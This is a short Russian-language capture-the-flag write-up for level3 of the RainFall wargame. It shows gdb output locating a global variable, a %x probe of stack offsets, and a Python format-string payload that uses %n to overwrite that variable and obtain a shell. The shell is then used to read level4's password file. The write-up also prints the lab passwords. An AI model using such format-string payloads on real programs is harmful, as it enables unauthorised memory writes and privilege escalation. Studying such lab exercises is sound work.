1. Залогинимся level3:492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
2. Инветсигируем, эта функция также повторяет наш ввод, но внутри есть проверка с глобальной переменной, которую мы можем переписать.
Так же внутри

0x080484da <+54>:    mov    eax,ds:0x804988c
0x080484df <+59>:    cmp    eax,0x40

(gdb) info variables
All defined variables:

Non-debugging symbols:
...
0x0804988c  m
...

3. Узнаем куда вводится наш буффер, который подаётся в printf. Для этого введём:

level3@RainFall:~$ ./level3
AAAA %x %x %x %x
AAAA 200 b7fd1ac0 b7ff37d0 41414141

Каждый раз обращаясь %x мы передвигаемся по памяти вперёд,
Получается вместо последнего %x мы можем использовать %n, чтобы прописать в значение по адресу указаному в начале.
Перед %n нужно вывести 64 символа, вычтем те, что выводятся и получим что не хватает 41

pythonc -c "print '\x8c\x98\x04\x08' +'a'*41 + %x%x%x%n" > /tmp/l3

level3@RainFall:~$ (python -c "print '\x8c\x98\x04\x08' + 'a' * 41 + '%x%x%x%n'"; cat -) | ./level3
▒aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa200b7fd1ac0b7ff37d0
Wait what?!
cd ..
cd level4
cat .pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
